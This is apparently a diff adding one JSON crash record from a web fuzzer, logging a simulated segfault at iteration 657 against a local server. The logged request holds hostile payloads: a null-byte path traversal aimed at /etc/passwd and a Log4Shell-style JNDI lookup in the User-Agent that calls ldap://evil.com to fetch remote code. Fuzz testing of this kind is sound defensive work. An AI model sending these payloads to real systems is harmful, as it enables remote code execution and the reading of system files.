@@ -1,0 +1,21 @@
+{
+  "timestamp": "2025-12-29T14:42:21.797189",
+  "crash_type": "segfault",
+  "payload": "GET /.\u0000.//.\u0000.//.\u0000.//etc/passwd?\nHeaders: {'User-Agent': '${jndi:ldap://evil.com/exploit}', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'Referer': '%2e%2e%2f%2e%2e%2f'}",
+  "payload_hash": "57cd97d1aba7fa54",
+  "request_method": "GET",
+  "request_path": "/.\u0000.//.\u0000.//.\u0000.//etc/passwd?",
+  "request_headers": {
+    "User-Agent": "${jndi:ldap://evil.com/exploit}",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "Referer": "%2e%2e%2f%2e%2e%2f"
+  },
+  "request_body": "",
+  "error_message": "Simulated segfault",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 657
+}
